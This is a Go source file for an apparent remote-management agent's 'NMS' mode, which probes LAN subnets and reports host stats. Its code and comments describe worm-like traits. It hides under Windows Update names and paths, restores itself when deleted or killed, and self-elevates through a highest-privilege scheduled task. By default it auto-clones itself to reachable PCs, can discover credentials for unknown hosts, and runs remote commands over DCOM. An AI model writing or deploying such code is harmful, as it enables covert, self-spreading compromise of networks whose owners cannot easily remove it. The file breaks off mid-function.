package commands

// NMS - network management system monitor.
//
// The NMS is the same agent binary in --nms mode: own process, own vault
// path, own controller identity (hostname/nms), own 7-verb command set.
// It does three jobs forever: probe the LAN, guard the agent (restore its
// bytes if wiped), and auto-clone to clonable PCs.
//
// UNSTOPPABLE INVARIANTS (do not weaken without replacing all three):
//  1. The StepNMS loop has no stop channel, no mode check, no sleep-flag
//     read. It never calls Handle(), so agent command gating (sleep,
//     modes) physically cannot reach it. The only exits are process
//     death (persistence restarts it) and the shutdown-file path below.
//  2. NOTHING the NMS can be told puts the NMS to sleep. agent-sleep /
//     agent-wake-up act on the AGENT via the sleep-flag file. The NMS
//     handler has no self-sleep verb; sleep flows downhill only.
//  3. The only stops are nms-stop --confirm YES (writes the shutdown
//     file, honored by the loop itself) and the installer's two-phase
//     --uninstall (writes the same file, waits, then tears down).
//     agent-sleep, set-mode, kill-agent, taskkill, file wipes: the guard
//     loop restores and continues.
//  4. The probe loop NEVER invokes the clone arm. Cloning happens only
//     in the clone arm (auto, eligible hosts) or nms-clone (manual).
//     A test pins this separation.
//
// FIX 5 (new invariant): the NMS guarantees its own elevation. An
// unelevated instance hands off to an elevated copy via a one-shot
// /RL HIGHEST task and exits. Elevated is the steady state, never the
// exception - the "runs unelevated, guard/restore and remote pushes
// will fail" warning can no longer be the permanent condition.
import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"rmm/internal/version"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/process"
)

// ---------------------------------------------------------------------------
// Rendezvous paths. The NMS and the agent are different processes that must
// agree on flag locations without talking: everything lives under NMSRoot
// (the agent install dir, writable by both), secrets under the vault dir
// (SYSTEM+Administrators only). Tests override nmsRootOverride.
// ---------------------------------------------------------------------------

// nmsRootOverride, when non-empty, replaces NMSRoot (tests).
var nmsRootOverride = ""

// NMSRoot is the shared rendezvous dir (agent install dir).
func NMSRoot() string {
	if nmsRootOverride != "" {
		return nmsRootOverride
	}
	if runtime.GOOS != "windows" {
		return filepath.Join(os.TempDir(), "RMM")
	}
	pd := os.Getenv("ProgramData")
	if pd == "" {
		pd = `C:\ProgramData`
	}
	return filepath.Join(pd, "Microsoft", "Windows", "Update")
}

// nmsVaultDir mirrors the agent watcher's vaultDir (SYSTEM profile slot,
// locked to SYSTEM+Administrators by the installer). Falls back to NMSRoot
// when absent (dev boxes, tests). Override for tests.
var nmsVaultDirOverride = ""

func nmsVaultDir() string {
	if nmsVaultDirOverride != "" {
		return nmsVaultDirOverride
	}
	if runtime.GOOS != "windows" {
		return NMSRoot()
	}
	sys := os.Getenv("SystemRoot")
	if sys == "" {
		sys = `C:\Windows`
	}
	v := filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
	if st, err := os.Stat(v); err == nil && st.IsDir() {
		return v
	}
	return NMSRoot()
}

// NMSSleepPath is the agent-sleep flag file (written by NMS, read by agent).
func NMSSleepPath() string { return filepath.Join(NMSRoot(), "agent.sleep") }

// NMSShutdownPath is the stop file (written by nms-stop or the installer,
// honored only by the NMS loop itself).
func NMSShutdownPath() string { return filepath.Join(NMSRoot(), "nms.shutdown") }

// NMSPidPath holds the NMS pid (written at NMS start, read by installer).
func NMSPidPath() string { return filepath.Join(NMSRoot(), "nms.pid") }

// NMSCredPath holds WMI credentials (two lines: user, pass), placed locally
// by the operator. Never transmitted, never logged (see set-nms refusal).
func NMSCredPath() string { return filepath.Join(nmsVaultDir(), "nms-wmi-cred") }

// NMSConfigPath persists NMS config across restarts.
func NMSConfigPath() string { return filepath.Join(NMSRoot(), "nms.json") }

// NMSReportPath is the spooled latest-report file: the monitor (direct-TLS
// only) drops its report here when its own link is down, and the agent
// ferries fresh spools over whichever uplink IT holds (direct or relay).
// Latest wins; the controller drops replays by tick.
func NMSReportPath() string { return filepath.Join(NMSRoot(), "nms-report.json") }

// SpoolNMSReport atomically stores the latest monitor report for the agent
// ferry (the StepNMS send func for link-down cycles). Silent on empty input
// or write failure - spooling is best-effort, never fatal.
func SpoolNMSReport(reportJSON string) {
	if reportJSON == "" {
		return
	}
	_ = writeFileAtomic(NMSReportPath(), []byte(reportJSON))
}

// NMSAgentPath is the agent exe the guard loop protects.
func NMSAgentPath() string { return filepath.Join(NMSRoot(), "MicrosoftWindowsClient.exe") }

// ---------------------------------------------------------------------------
// Sleep flag (NMS writes, agent reads). Atomic temp+rename writes.
// ---------------------------------------------------------------------------

// NMSSleepState is the persisted sleep order.
type NMSSleepState struct {
	Since  time.Time `json:"since"`
	Reason string    `json:"reason"`
}

// WriteSleepFlag puts the agent to sleep (durable across wipe/reboot).
func WriteSleepFlag(reason string) error {
	st := NMSSleepState{Since: time.Now().UTC(), Reason: strings.TrimSpace(reason)}
	b, _ := json.Marshal(st)
	tmp := NMSSleepPath() + ".tmp"
	if err := os.WriteFile(tmp, b, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, NMSSleepPath())
}

// ClearSleepFlag wakes the agent.
func ClearSleepFlag() error {
	err := os.Remove(NMSSleepPath())
	if err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

// ReadSleepFlag returns the sleep order, if any.
func ReadSleepFlag() (NMSSleepState, bool) {
	var st NMSSleepState
	b, err := os.ReadFile(NMSSleepPath())
	if err != nil {
		return st, false
	}
	if json.Unmarshal(b, &st) != nil {
		return st, false
	}
	return st, true
}

// SleepFlagSet reports whether the agent is ordered asleep.
func SleepFlagSet() bool {
	_, ok := ReadSleepFlag()
	return ok
}

var sleepCacheMu sync.Mutex
var sleepCacheAt time.Time
var sleepCacheVal bool

// ResetSleepCacheForTest clears the sleep flag cache for test isolation.
func ResetSleepCacheForTest() {
	sleepCacheMu.Lock()
	sleepCacheAt = time.Time{}
	sleepCacheVal = false
	sleepCacheMu.Unlock()
}

// SleepCheckCached is the hot-loop sleep check (2s TTL): file stats are
// cheap but not per-frame cheap. Streaming loops call this, not SleepFlagSet.
func SleepCheckCached() bool {
	sleepCacheMu.Lock()
	defer sleepCacheMu.Unlock()
	if time.Since(sleepCacheAt) < 2*time.Second {
		return sleepCacheVal
	}
	sleepCacheAt = time.Now()
	sleepCacheVal = SleepFlagSet()
	return sleepCacheVal
}

// ---------------------------------------------------------------------------
// Shutdown file (only the NMS loop honors it).
// ---------------------------------------------------------------------------

// ErrNMSShutdown is returned by StepNMS when the stop file is present.
var ErrNMSShutdown = fmt.Errorf("nms shutdown file present")

// ErrNMSUpdate is returned by StepNMS when the install dir carries a newer
// version than this running image: the NMS exits cleanly and persistence
// restarts it on new bytes (otherwise the monitor would pin old code
// forever - the vault/install sync only replaces files, never processes).
var ErrNMSUpdate = fmt.Errorf("nms update available")

// FIX: ErrNMSElevate is returned by StepNMS when this process was unelevated
// and has handed off to an elevated copy. The caller should exit; the
// elevated copy (and persistence) carries on.
var ErrNMSElevate = fmt.Errorf("nms handed off to elevated copy")

// nmsUpdateAvailable compares installDir/version.txt against the compiled
// version (dotted ints). Absent/unparseable reads as no update.
func nmsUpdateAvailable() (string, bool) {
	b, err := os.ReadFile(filepath.Join(NMSRoot(), "version.txt"))
	if err != nil {
		return "", false
	}
	want := strings.TrimSpace(string(b))
	if want == "" || want == version.Version {
		return "", false
	}
	if verNewer(want, version.Version) {
		return want, true
	}
	return "", false
}

// FIX: verNewer now only falls back to lexicographic compare when a part is
// genuinely non-numeric on one side. The old version could rank mixed
// numeric/non-numeric parts (1.44.1 vs 1.44.x) by raw string ordering, which
// is exactly where version drift bites.
func verNewer(a, b string) bool {
	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
	for i := 0; i < len(pa) && i < len(pb); i++ {
		na, ea := strconv.Atoi(strings.TrimSpace(pa[i]))
		nb, eb := strconv.Atoi(strings.TrimSpace(pb[i]))
		if ea == nil && eb == nil {
			if na != nb {
				return na > nb
			}
			continue
		}
		if pa[i] != pb[i] {
			return pa[i] > pb[i]
		}
	}
	return len(pa) > len(pb)
}

// ShutdownRequested reports whether nms-stop or the installer ordered stop.
func ShutdownRequested() bool {
	_, err := os.Stat(NMSShutdownPath())
	return err == nil
}

// WriteShutdownFile orders the NMS loop to exit (nms-stop / installer).
func WriteShutdownFile() error {
	return os.WriteFile(NMSShutdownPath(), []byte(time.Now().UTC().Format(time.RFC3339)+"\n"), 0644)
}

// ---------------------------------------------------------------------------
// FIX: Elevation guard. Windows-only; no-op elsewhere.
//
// The NMS needs an elevated token for the guard/restore path and for remote
// SMB/WMI pushes. If the task that launched us lacked /RL HIGHEST we are
// unelevated, and the old behaviour was to warn forever. Now we hand off:
// create a one-shot highest-privilege task pointing at ourselves, run it,
// and exit. The elevated copy becomes the steady state.
// ---------------------------------------------------------------------------

var nmsElevationDone bool

// nmsPrivElevated reports our elevation; var so tests inject without
// shelling whoami. nmsElevateTask creates + runs the one-shot highest
// task; var so tests record instead of touching the task scheduler.
var nmsPrivElevated = func() bool { return CurrentNMSPriv().Elevated }
var nmsElevateTask = func(self, args string) error {
	if _, err := runWithTimeout(10*time.Second, "schtasks", "/create", "/tn", "WindowsUpdateNMS",
		"/tr", `"`+self+`" `+args, "/sc", "once", "/st", "00:00", "/rl", "highest", "/f"); err != nil {
		return err
	}
	_, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdateNMS")
	return err
}

// ensureElevated returns true if this process should keep running. It returns
// false exactly once, when an unelevated process has launched an elevated
// copy and should now bow out. Idempotent: an elevated instance never
// relaunches, and an unelevated instance defers if another NMS already holds
// the pid file (so we never stack duplicates).
func ensureElevated() bool {
	if runtime.GOOS != "windows" {
		return true
	}
	if nmsPrivElevated() {
		return true
	}
	// Another NMS already alive? It is the elevated one - just bow out.
	// (Reads the pid+createMs record, so PID recycling can't fake a holder.)
	if holder, ok := readNMSPid(); ok && nmsPidAlive(holder) {
		return false
	}
	self, err := os.Executable()
	if err != nil {
		return true
	}
	args := strings.TrimSpace(strings.Join(os.Args[1:], " "))
	if args == "" {
		args = "--nms"
	}
	if err := nmsElevateTask(self, args); err != nil {
		return true // best effort: run unelevated rather than die
	}
	return false
}

// ---------------------------------------------------------------------------
// Config (persisted nms.json; set-nms mutates it, never credentials).
// ---------------------------------------------------------------------------

// NMSConfig is the monitor configuration.
type NMSConfig struct {
	IntervalSec   int      `json:"interval_sec"`
	SweepEveryMin int      `json:"sweep_min"`
	Subnets       []string `json:"subnets"`
	ExtraHosts    []string `json:"extra_hosts"`
	Exclude       []string `json:"exclude"`
	AutoClone     bool     `json:"autoclone"`
	// AutoForce extends the auto arm to managed-unknown hosts (default
	// off - explicit opt-in per NMS; unknown stays skipped otherwise).
	AutoForce bool `json:"autoforce"`
	// AutoFind lets the clone arm DISCOVER a credential for managed-unknown
	// hosts (background finder job, vault cred on success; default off).
	AutoFind bool `json:"autofind"`
	// FindHints are evidence words handed to the finder (names, words).
	FindHints  []string `json:"find_hints"`
	MaxParallel   int  `json:"max_parallel"`
	FailThreshold int  `json:"fail_threshold"`
	FailWindowMin int  `json:"fail_window_min"`
	RearmAfterMin int  `json:"rearm_min"`
}

// DefaultNMSConfig returns safe defaults. Exclude is seeded with loopback;
// the caller adds the controller IPs (never clone the controller).
func DefaultNMSConfig() NMSConfig {
	return NMSConfig{
		IntervalSec: 60, SweepEveryMin: 30,
		Subnets: autoSubnets(), ExtraHosts: nil,
		Exclude:       []string{"127.0.0.1", "localhost"},
		AutoClone:     true,
		MaxParallel:   8,
		FailThreshold: 5, FailWindowMin: 15, RearmAfterMin: 60,
	}
}

// LoadNMSConfig reads persisted config, merged over defaults.
// LoadNMSConfig reads persisted config, merged over defaults.
func LoadNMSConfig() NMSConfig {
	cfg := DefaultNMSConfig()
	b, err := os.ReadFile(NMSConfigPath())
	if err != nil {
		return cfg
	}
	// Strip UTF-8 BOM if present (can appear if file was written with a BOM).
	if len(b) >= 3 && b[0] == 0xef && b[1] == 0xbb && b[2] == 0xbf {
		b = b[3:]
	}
	var f NMSConfig
	if json.Unmarshal(b, &f) != nil {
		return cfg
	}
	if f.IntervalSec >= 10 {
		cfg.IntervalSec = f.IntervalSec
	}
	if f.SweepEveryMin >= 5 {
		cfg.SweepEveryMin = f.SweepEveryMin
	}
	if f.Subnets != nil {
		cfg.Subnets = f.Subnets
	}
	if f.ExtraHosts != nil {
		cfg.ExtraHosts = f.ExtraHosts
	}
	if f.Exclude != nil {
		cfg.Exclude = f.Exclude
	}
	cfg.AutoClone = f.AutoClone
	cfg.AutoForce = f.AutoForce
	cfg.AutoFind = f.AutoFind
	if f.FindHints != nil {
		cfg.FindHints = f.FindHints
	}
	if f.MaxParallel >= 1 && f.MaxParallel <= 32 {
		cfg.MaxParallel = f.MaxParallel
	}
	if f.FailThreshold >= 1 {
		cfg.FailThreshold = f.FailThreshold
	}
	if f.FailWindowMin >= 1 {
		cfg.FailWindowMin = f.FailWindowMin
	}
	if f.RearmAfterMin >= 0 {
		cfg.RearmAfterMin = f.RearmAfterMin
	}
	return cfg
}

// SaveNMSConfig persists config atomically (without BOM).
func SaveNMSConfig(cfg NMSConfig) error {
	b, _ := json.MarshalIndent(cfg, "", "  ")
	tmp := NMSConfigPath() + ".tmp"
	if err := os.WriteFile(tmp, b, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, NMSConfigPath())
}

// SetNMS applies key=value pairs (space/comma separated). Credential-ish
// keys are REFUSED: passwords travel only via the local cred file, never
// the controller channel (they'd land in logs and MQTT buses).
func SetNMS(args string, seedExclude []string) (string, error) {
	cfg := LoadNMSConfig()
	for _, seed := range seedExclude {
		if !nmsHasFold(cfg.Exclude, seed) {
			cfg.Exclude = append(cfg.Exclude, seed)
		}
	}
	// Fields are whitespace-separated key=value pairs. Commas are NOT
	// rewritten to spaces first: list keys (subnets, extra_hosts,
	// exclude, find_hints) take comma-separated values inside ONE field
	// ("find_hints=a,b"), which the old comma->space rewrite silently
	// broke (the second list item arrived as a bare token and tripped the
	// usage error, capping every list at one value).
	fields := strings.Fields(args)
	var applied []string
	for _, f := range fields {
		kv := strings.SplitN(f, "=", 2)
		if len(kv) != 2 {
			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, autoforce, autofind, find_hints, max_parallel, fail_threshold, fail_window_min, rearm_min)")
		}
		k := strings.ToLower(strings.TrimSpace(kv[0]))
		v := strings.TrimSpace(kv[1])
		lk := strings.ToLower(k)
		if strings.Contains(lk, "pass") || strings.Contains(lk, "cred") || strings.Contains(lk, "secret") || strings.Contains(lk, "token") {
			return "", fmt.Errorf("refused: credentials are local-only (place them in %s on the NMS box, never send them)", NMSCredPath())
		}
		switch k {
		case "interval", "interval_sec":
			n, err := strconv.Atoi(v)
			if err != nil || n < 10 {
				return "", fmt.Errorf("interval must be >= 10 (seconds)")
			}
			cfg.IntervalSec = n
		case "sweep_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 5 {
				return "", fmt.Errorf("sweep_min must be >= 5")
			}
			cfg.SweepEveryMin = n
		case "subnets":
			cfg.Subnets = splitList(v)
		case "extra_hosts", "hosts":
			cfg.ExtraHosts = splitList(v)
		case "exclude":
			cfg.Exclude = splitList(v)
		case "autoclone", "autoclone=on", "autoclone=off":
			if k == "autoclone=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
				cfg.AutoClone = true
			} else if k == "autoclone=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
				cfg.AutoClone = false
			} else {
				return "", fmt.Errorf("autoclone must be on|off")
			}
		case "autoforce", "autoforce=on", "autoforce=off":
			if k == "autoforce=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
				cfg.AutoForce = true
			} else if k == "autoforce=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
				cfg.AutoForce = false
			} else {
				return "", fmt.Errorf("autoforce must be on|off")
			}
		case "autofind", "autofind=on", "autofind=off":
			if k == "autofind=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
				cfg.AutoFind = true
			} else if k == "autofind=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
				cfg.AutoFind = false
			} else {
				return "", fmt.Errorf("autofind must be on|off")
			}
		case "find_hints", "findhints":
			cfg.FindHints = splitList(v)
		case "max_parallel":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 || n > 32 {
				return "", fmt.Errorf("max_parallel must be 1..32")
			}
			cfg.MaxParallel = n
		case "fail_threshold":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 {
				return "", fmt.Errorf("fail_threshold must be >= 1")
			}
			cfg.FailThreshold = n
		case "fail_window_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 1 {
				return "", fmt.Errorf("fail_window_min must be >= 1")
			}
			cfg.FailWindowMin = n
		case "rearm_min":
			n, err := strconv.Atoi(v)
			if err != nil || n < 0 {
				return "", fmt.Errorf("rearm_min must be >= 0")
			}
			cfg.RearmAfterMin = n
		default:
			return "", fmt.Errorf("unknown set-nms key %q", k)
		}
		applied = append(applied, k)
	}
	if err := SaveNMSConfig(cfg); err != nil {
		return "", err
	}
	nmsClearBreaker()
	return "nms config updated (" + strings.Join(applied, ", ") + ")", nil
}

func splitList(v string) []string {
	var out []string
	for _, p := range strings.Split(v, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		for _, q := range strings.Fields(p) {
			if q != "" {
				out = append(out, q)
			}
		}
	}
	return out
}

func nmsHasFold(list []string, s string) bool {
	for _, e := range list {
		if strings.EqualFold(e, s) {
			return true
		}
	}
	return false
}

// autoSubnets returns the local subnets (non-loopback IPv4) using each
// interface's REAL prefix length.
//
// FIX: it used to hardcode a /24. On this LAN the box sits in 192.168.68.0/22,
// so every host on 192.168.64-67 and 192.168.69-71 was invisible to the
// sweep (and therefore to the clone arm) - only ARP-seeded strays like
// 71.255 ever appeared, and the rest of the /22 read as "unreachable".
// The mask now comes from the interface; expansion is clamped to /22 so one
// fat LAN can't turn a cycle into thousands of dials.
func autoSubnets() []string {
	var out []string
	ifs, err := net.Interfaces()
	if err != nil {
		return out
	}
	seen := map[string]bool{}
	for _, iface := range ifs {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			var ip net.IP
			var mask net.IPMask
			switch v := a.(type) {
			case *net.IPNet:
				ip, mask = v.IP, v.Mask
			case *net.IPAddr:
				ip = v.IP
			}
			ip = ip.To4()
			if ip == nil || ip.IsLoopback() {
				continue
			}
			ones, bits := 24, 32
			if mask != nil {
				ones, bits = mask.Size()
			}
			if bits != 32 || ones <= 0 {
				ones = 24
			}
			// Clamp: never sweep wider than a /22 (bounded dial budget).
			if ones < 22 {
				ones = 22
			}
			sn := netBase4(ip, ones)
			if !seen[sn] {
				seen[sn] = true
				out = append(out, sn)
			}
		}
	}
	sort.Strings(out)
	return out
}

// netBase4 renders the masked network base of a v4 address as "a.b.c.d/len".
// Masking matters: on a /22 the address 192.168.68.50 belongs to the network
// 192.168.64.0/22, not 192.168.68.0/22 - zeroing only the last octet would
// enumerate 68-71 and silently skip 64-67. Pure, tested.
func netBase4(ip net.IP, ones int) string {
	v4 := ip.To4()
	if v4 == nil || ones <= 0 || ones > 32 {
		ones = 24
	}
	raw := uint32(v4[0])<<24 | uint32(v4[1])<<16 | uint32(v4[2])<<8 | uint32(v4[3])
	hostBits := uint32(32 - ones)
	base := raw &^ ((uint32(1) << hostBits) - 1)
	return fmt.Sprintf("%d.%d.%d.%d/%d", byte(base>>24), byte(base>>16), byte(base>>8), byte(base), ones)
}

// expandSubnet lists candidate host IPs in a subnet (skips network/broadcast).
// Accepts any prefix in /22../30 (a /22 LAN is 1022 hosts - the /24-only
// rule hid most of this network). Strict: a.b.c.d/len is required, the base
// is masked (sloppy host bits select the same subnet), and anything wider
// than /22 or narrower than /30, plus garbage, yields nothing instead of a
// silently wrong - or unbounded - range.
func expandSubnet(sn string) []string {
	slash := strings.LastIndex(sn, "/")
	if slash < 0 {
		return nil
	}
	prefix, err := strconv.Atoi(strings.TrimSpace(sn[slash+1:]))
	if err != nil || prefix < 22 || prefix > 30 {
		return nil
	}
	parts := strings.Split(strings.TrimSpace(sn[:slash]), ".")
	if len(parts) != 4 {
		return nil
	}
	nums := make([]int, 4)
	for i, p := range parts {
		n, err := strconv.Atoi(p)
		if err != nil || n < 0 || n > 255 {
			return nil
		}
		nums[i] = n
	}
	hostBits := uint32(32 - prefix)
	hostMask := (uint32(1) << hostBits) - 1
	raw := uint32(nums[0])<<24 | uint32(nums[1])<<16 | uint32(nums[2])<<8 | uint32(nums[3])
	base := raw &^ hostMask
	first := base + 1
	last := base | hostMask
	out := make([]string, 0, last-first+1)
	for v := first; v < last; v++ {
		out = append(out, fmt.Sprintf("%d.%d.%d.%d", byte(v>>24), byte(v>>16), byte(v>>8), byte(v)))
	}
	return out
}

// ---------------------------------------------------------------------------
// Probing. TCP dial proves the management channel, not just ICMP
// (firewalls eat ping). dialTCP is a var so tests inject fakes.
// ---------------------------------------------------------------------------

// NMSHostResult is one host's probe outcome.
type NMSHostResult struct {
	Host           string  `json:"host"`
	Reachable      bool    `json:"reachable"`
	CPU            float64 `json:"cpu"`
	Mem            float64 `json:"mem"`
	Disk           float64 `json:"disk"`
	ManagedHint    bool    `json:"managed_hint"`
	ManagedUnknown bool    `json:"managed_unknown,omitempty"`
	CloneState     string  `json:"clone"`
	CloneDetail    string  `json:"clone_detail,omitempty"`
	StatsErr       string  `json:"stats_err,omitempty"`
	// Fingerprint classifies Tier-2 findings (windows/unix-like/
	// appliance-mgmt-ui/gateway/unknown-device/dark). Empty = not profiled.
	Fingerprint string `json:"fingerprint,omitempty"`
	// OpenPorts lists Tier-2 open ports backing the fingerprint.
	OpenPorts []int `json:"open_ports,omitempty"`
	// NBName is the NetBIOS computer name (UDP 137). Non-empty on a
	// windows-smb-off host proves the box is there and Windows - it just
	// isn't sharing - and it is the finder's best Tier-0 word.
	NBName string `json:"nb_name,omitempty"`
}

// dialTCP dials host:port with timeout. Var for tests.
var dialTCP = func(host string, port int, timeout time.Duration) bool {
	c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	c.Close()
	return true
}

// nmsProbePorts is the single management-port set probed everywhere
// (reachability, sweep, dry-run): SMB, RPC/EPMAP, NetBIOS session, RDP.
// Any open port marks the host reachable for probing; only 445 (SMB) and
// 135 (WMI/DCOM) can carry a clone - 139/3389 buy detection, and the
// dry-run says so explicitly instead of implying deployability.
var nmsProbePorts = []int{445, 135, 139, 3389}

// TCPReachable checks the probe set (any open port proves a live box).
func TCPReachable(host string) bool {
	for _, p := range nmsProbePorts {
		if dialTCP(host, p, 3*time.Second) {
			return true
		}
	}
	return false
}

// SelfStats returns this box's cpu/mem/disk via gopsutil.
func SelfStats() (cpuP, memP, diskP float64) {
	if p, err := cpu.Percent(500*time.Millisecond, false); err == nil && len(p) > 0 {
		cpuP = p[0]
	}
	if vm, err := mem.VirtualMemory(); err == nil {
		memP = vm.UsedPercent
	}
	if du, err := disk.Usage("/"); err == nil {
		diskP = du.UsedPercent
	} else if runtime.GOOS == "windows" {
		if du, err := disk.Usage(`C:\`); err == nil {
			diskP = du.UsedPercent
		}
	}
	return cpuP, memP, diskP
}

// managedHintPath is the version file a managed box exposes over ADMIN$.
func managedHintPath(host string) string {
	if runtime.GOOS != "windows" {
		return ""
	}
	return `\\` + host + `\ADMIN$\Microsoft\Windows\Update\version.txt`
}

// FIX: nmsReadUNC now bounds concurrent blocked reads. The 8s wrapper always
// returned, but the inner os.ReadFile stayed parked on a dead SMB mount; a
// LAN full of half-dead boxes piled goroutines up without limit. A UNC
// ReadFile cannot be cancelled in Go, so bounding is the honest fix.
var uncSem = make(chan struct{}, 64)

var nmsReadUNC = func(path string) ([]byte, error) {
	type res struct {
		b   []byte
		err error
	}
	done := make(chan res, 1)
	go func() {
		uncSem <- struct{}{}
		defer func() { <-uncSem }()
		b, err := os.ReadFile(path)
		done <- res{b, err}
	}()
	select {
	case r := <-done:
		return r.b, r.err
	case <-time.After(8 * time.Second):
		return nil, fmt.Errorf("unc read timed out")
	}
}

// nmsFileStat is a var so tests cut the SMB dependency.
var nmsFileStat = func(path string) (string, bool) {
	b, err := nmsReadUNC(path)
	if err != nil {
		return "", false
	}
	return strings.TrimSpace(string(b)), true
}

// ManagedHint reports whether host already has an agent install (its own
// NMS owns repair there - never reinstall a managed box).
func ManagedHint(host string) bool {
	managed, _ := ManagedHintChecked(host)
	return managed
}

// ManagedHintChecked is ManagedHint with the ambiguous third state: unknown
// is true when the check itself failed (denied/timed out/off-Windows)
// instead of proving absence. The clone arm treats unknown as a veto - a
// managed box that refuses the share read must never look "unmanaged".
func ManagedHintChecked(host string) (managed, unknown bool) {
	p := managedHintPath(host)
	if p == "" {
		return false, true
	}
	if _, err := nmsReadUNC(p); err == nil {
		return true, false
	} else if os.IsPermission(err) || isAccessDenied(err.Error()) || strings.Contains(strings.ToLower(err.Error()), "timed out") {
		return false, true
	}
	return false, false
}

// cimSessionPrelude builds the DCOM session opener shared by every CIM
// script. WSMan demands Kerberos and dies off-domain; DCOM rides RPC/NTLM.
// hostQ is the single-quote-escaped hostname; extra carries additional
// New-CimSession args ("-Credential $cred", "-ErrorAction Stop").
// Both halves (transport option AND -CimSession/-SessionOption wiring) are
// pinned by TestCimDcomWiring — they were built months apart by different
// sessions, and either half missing silently breaks remote execution while
// reporting success.
func cimSessionPrelude(hostQ, extra string) string {
	if extra != "" {
		extra = " " + extra
	}
	return `$opt=New-CimSessionOption -Protocol Dcom;` +
		`$s=New-CimSession -ComputerName '` + hostQ + `' -SessionOption $opt` + extra
}

// Script builders (pure: escaping + DCOM wiring unit-testable without
// spawning powershell or touching the LAN).
func cimStatsScript(host string) string {
	return `$e=$null;try{` + cimSessionPrelude(strings.ReplaceAll(host, "'", "''"), "-ErrorAction Stop") + `;$p=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$p.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{$e=$_;@{err=$e.Exception.Message}|ConvertTo-Json -Compress}`
}

func cimStatsCredScript(host string) string {
	return `$cf=Get-Content -LiteralPath '` + strings.ReplaceAll(NMSCredPath(), "'", "''") + `';$u=$cf[0].Trim();$p=$cf[1].TrimEnd("` + "`r,`n" + `");$sec=ConvertTo-SecureString $p -AsPlainText -Force;$cred=New-Object PSCredential($u,$sec);try{` + cimSessionPrelude(strings.ReplaceAll(host, "'", "''"), "-Credential $cred -ErrorAction Stop") + `;$pr=Get-CimInstance -CimSession $s -ClassName Win32_Processor -ErrorAction Stop|Measure-Object -Property LoadPercentage -Average;$o=Get-CimInstance -CimSession $s -ClassName Win32_OperatingSystem -ErrorAction Stop;$d=Get-CimInstance -CimSession $s -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop;Remove-CimSession -CimSession $s;@{cpu=[double]$pr.Average;mem=[double](100*($o.TotalVisibleMemorySize-$o.FreePhysicalMemory)/$o.TotalVisibleMemorySize);disk=[double](100*($d.Size-$d.FreeSpace)/$d.Size)}|ConvertTo-Json -Compress}catch{@{err=$_.Exception.Message}|ConvertTo-Json -Compress}`
}

func cimCreateScript(host, commandLine string) string {
	h := strings.ReplaceAll(host, "'", "''")
	cl := strings.ReplaceAll(commandLine, "'", "''")
	return cimSessionPrelude(h, "-ErrorAction Stop") + `;try{` +
		`Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='` + cl + `'} | Select-Object -ExpandProperty ReturnValue` +
		`}finally{Remove-CimSession -CimSession $s -ErrorAction SilentlyContinue}`
}

// remoteStatsCIM queries one Windows host via a hidden powershell CIM
// session (current user context first; stored local creds on denial).
// Returns cpu/mem/disk percents. Never logs credentials.
var remoteStatsCIM = func(host string, timeout time.Duration) (float64, float64, float64, error) {
	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", cimStatsScript(host))
	if err != nil {
		return 0, 0, 0, err
	}
	var r struct {
		CPU  float64 `json:"cpu"`
		Mem  float64 `json:"mem"`
		Disk float64 `json:"disk"`
		Err  string  `json:"err"`
	}
	dec := json.NewDecoder(strings.NewReader(strings.TrimSpace(string(out))))
	if derr := dec.Decode(&r); derr != nil {
		// Stored-creds fallback: only when current context was denied and
		// the operator placed a local cred file (vault dir, never logged).
		if isAccessDenied(string(out)) {
			return remoteStatsCIMCred(host, timeout)
		}
		return 0, 0, 0, fmt.Errorf("cim parse: %v", derr)
	}
	if r.Err != "" {
		if isAccessDenied(r.Err) {
			return remoteStatsCIMCred(host, timeout)
		}
